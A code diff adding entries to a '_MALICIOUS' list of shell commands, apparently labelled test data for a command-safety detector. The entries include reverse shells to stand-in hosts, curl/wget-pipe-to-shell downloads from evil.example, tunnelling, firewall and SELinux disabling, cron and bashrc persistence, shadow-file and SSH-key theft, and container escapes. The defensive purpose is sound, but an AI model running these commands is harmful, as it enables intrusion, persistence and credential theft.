@@ -73,6 +73,38 @@ _MALICIOUS = [
     "useradd -o -u 0 backdoor",
     "usermod -aG sudo bob",
     "systemctl enable evil.service",
+    # Additional reverse shells / interpreters
+    'php -r \'$s=fsockopen("1.2.3.4",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
+    'ruby -rsocket -e \'c=TCPSocket.new("1.2.3.4",4444);exec "/bin/sh -i"\'',
+    "awk 'BEGIN{s=\"/inet/tcp/0/1.2.3.4/4444\"}'",
+    "curl http://evil.example/x.sh | sudo bash",
+    "wget -qO- http://evil.example/x.py | python3",
+    # Supply chain / git
+    "pip install git+http://evil.example/pkg.git",
+    "npm install https://evil.example/pkg.tgz",
+    "npx http://evil.example/pkg",
+    "git clone http://1.2.3.4/repo.git",
+    "git config core.hookspath /tmp/hooks",
+    # Tunneling / pivoting
+    "ssh -R 8080:127.0.0.1:80 user@1.2.3.4",
+    "ssh -D 1080 user@1.2.3.4 -N -f",
+    "chisel client 1.2.3.4:8080 r:socks",
+    "ngrok tcp 22",
+    # Defense evasion
+    "setenforce 0",
+    "iptables -F",
+    "chattr +i /tmp/evil",
+    # Persistence
+    "echo '* * * * * /tmp/x' | crontab -",
+    "echo '/tmp/implant &' >> /root/.bashrc",
+    "LD_PRELOAD=/tmp/evil.so /bin/ls",
+    # Credential access / cloud / container
+    "cat /etc/shadow",
+    "find / -name id_rsa 2>/dev/null",
+    "python3 mimipenguin.py",
+    "curl http://169.254.169.254/latest/meta-data/",
+    "nsenter --target 1 --mount --net --pid -- /bin/bash",
+    "docker run --privileged -v /:/host alpine",
 ]
 
 _BENIGN = [
